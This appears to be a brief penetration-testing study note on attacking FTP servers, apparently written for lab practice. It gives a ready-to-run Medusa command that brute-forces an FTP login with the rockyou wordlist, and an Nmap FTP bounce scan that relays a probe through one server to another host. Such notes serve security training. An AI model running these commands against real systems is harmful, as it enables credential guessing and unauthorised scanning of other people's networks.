# Attacking FTP

**Brute forcing FTP with Medusa**

```sh
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

**FTP Bounce Attack**
Attack that uses FTP servers to deliver outbound traffic to another device on the network.
The attacker uses `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

![[FTP Bounce Attack.png]]

The flag `-b` in Nmap can be used to do FTP bounce attack:

```sh
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

